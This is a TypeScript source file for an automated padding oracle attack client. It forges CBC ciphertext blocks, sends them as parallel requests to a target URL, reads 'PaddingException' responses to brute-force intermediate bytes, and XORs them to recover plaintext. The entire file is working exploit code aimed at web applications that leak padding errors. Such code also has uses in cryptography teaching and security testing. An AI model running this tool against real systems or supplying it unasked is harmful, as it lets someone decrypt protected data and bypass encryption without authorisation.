import fetch from "node-fetch";
import CryptUtil from "./CryptUtil";
import PseudoBlock from "./PseudoBlock";
import TextUtils from "./TextUtils";
import { AbortSignal } from "node-fetch/externals";

export default class Requester {
  private readonly cu: CryptUtil;
  private readonly tu: TextUtils;
  private readonly pseudo: PseudoBlock;
  private readonly threads: number;

  constructor(block: Buffer, iv: Buffer, threads = 10) {
    this.cu = new CryptUtil();
    this.tu = new TextUtils();
    this.pseudo = new PseudoBlock(block, iv);
    this.threads = threads;
  }

  protected async send(payload: string, signal?: AbortSignal): Promise<string> {
    const url = process.env.URL + payload;

    const resp = await fetch(url, {
      signal,
    });

    if (!resp.ok) {
      throw new Error(`Fetch error (${resp.status}): ${resp.statusText}`);
    }

    return await resp.text();
  }

  protected paddingError(text: string): boolean {
    if (/PaddingException/gi.test(text)) {
      return true;
    }

    return false;
  }

  protected async checkPaddingValidity(
    payload: string,
    signal?: AbortSignal
  ): Promise<boolean> {
    const response = await this.send(payload, signal);
    return !this.paddingError(response);
  }

  protected async checkBlock(
    intermediate: Buffer,
    signal?: AbortSignal
  ): Promise<boolean | Buffer> {
    const binData = this.cu.joinBlocks(this.pseudo.getFake(intermediate));
    const payload = this.tu.bytes2src(binData);

    const result = await this.checkPaddingValidity(payload, signal);

    if (result) {
      return intermediate;
    } else {
      return false;
    }
  }

  protected async findByteParallel(): Promise<void> {
    const blocks = [];
    for (let i = 0; i < 256; i++) {
      blocks.push(this.pseudo.getIntermediateBlock());
      if (i < 255) this.pseudo.incrementByte();
    }

    while(blocks.length) {
      const blocksNow = blocks.splice(0, this.threads);

      const tasks = blocksNow.map(block => {
        return this.checkBlock(block);
      });

      const runResult = await Promise.all(tasks);
      const goodResults = runResult.filter(result => result !== false);

      if (goodResults.length) {
        const rightBlock = goodResults[0] as Buffer;
        this.pseudo.setIntermediateBlock(rightBlock);
        break;
      }
    }
  }

  protected async findBlock(): Promise<void> {
    for (let i = 0; i < 16; i++) {
      await this.findByteParallel();
      this.pseudo.saveByte();
      this.pseudo.shufflePointer();
    }
  }

  public async calculateBlock(): Promise<Buffer> {
    await this.findBlock();
    return this.pseudo.xorIM();
  }
}
